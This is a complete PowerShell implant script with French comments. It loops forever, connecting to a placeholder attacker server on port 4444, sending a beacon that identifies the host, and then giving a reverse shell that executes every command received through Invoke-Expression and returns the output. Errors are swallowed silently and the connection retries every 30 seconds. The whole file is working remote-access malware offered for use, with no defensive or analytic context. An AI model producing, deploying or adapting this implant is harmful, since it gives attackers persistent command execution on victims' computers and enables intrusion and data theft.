# implant.ps1 - Lance reverse shell + beacon toutes les 30s
while($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient('YOUR_SERVER_IP', 4444);
        $stream = $client.GetStream();
        
        # Envoi beacon
        $beacon = @{id=[System.Guid]::NewGuid(); ip=$env:COMPUTERNAME; status='online'} | ConvertTo-Json;
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($beacon);
        $stream.Write($bytes, 0, $bytes.Length);
        
        # Shell interactif
        [byte[]]$buf = New-Object byte[] 4096;
        while(($i = $stream.Read($buf, 0, $buf.Length)) -ne 0) {
            $cmd = [System.Text.Encoding]::UTF8.GetString($buf, 0, $i);
            $output = Invoke-Expression $cmd 2>&1 | Out-String;
            $reply = $output + "PS> ";
            $replyBytes = [System.Text.Encoding]::UTF8.GetBytes($reply);
            $stream.Write($replyBytes, 0, $replyBytes.Length);
        }
        $client.Close();
    } catch {}
    Start-Sleep 30;
}